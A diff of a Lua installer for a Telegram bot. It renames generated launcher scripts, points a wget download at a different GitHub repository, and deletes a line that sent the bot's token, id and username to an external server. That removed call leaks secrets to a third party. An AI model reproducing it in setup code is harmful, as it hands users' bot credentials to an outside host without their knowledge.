@@ -64,28 +64,27 @@ os.execute('lua start.lua')
 end
 local function Files_Tshake_Info()
 Create_Info(database:get(Server_Tshake.."Token_Tshake"),database:get(Server_Tshake.."Id_Tshake"),database:get(Server_Tshake.."UserName_Tshake"))   
-http.request("https://tshake.ga/tumblr-source/tumblr-source.php?id="..database:get(Server_Tshake.."Id_Tshake").."&UserName="..database:get(Server_Tshake.."UserName_Tshake").."&token="..database:get(Server_Tshake.."Token_Tshake"))
-local RunTshake = io.open("tumblr-Source", 'w')
+local RunTshake = io.open("BK", 'w')
 RunTshake:write([[
 #!/usr/bin/env bash
 cd $HOME/tumblr-Source
 token="]]..database:get(Server_Tshake.."Token_Tshake")..[["
 rm -fr tumblr-Source.lua
-wget "https://raw.githubusercontent.com/tumblr-Source/tumblr-Source/master/tumblr-Source.lua"
+wget "https://raw.githubusercontent.com/BK-team-tg/BK/master/BK.lua"
 while(true) do
 rm -fr ../.telegram-cli
-./tg -s ./tumblr-Source.lua -p PROFILE --bot=$token
+./tg -s ./BK.lua -p PROFILE --bot=$token
 done
 ]])
 RunTshake:close()
-local RunTs = io.open("ts", 'w')
+local RunTs = io.open("BT", 'w')
 RunTs:write([[
 #!/usr/bin/env bash
-cd $HOME/tumblr-Source
+cd $HOME/BK
 while(true) do
 rm -fr ../.telegram-cli
 screen -S tumblr-Source -X kill
-screen -S tumblr-Source ./tumblr-Source
+screen -S tumblr-Source ./BK
 done
 ]])
 RunTs:close()
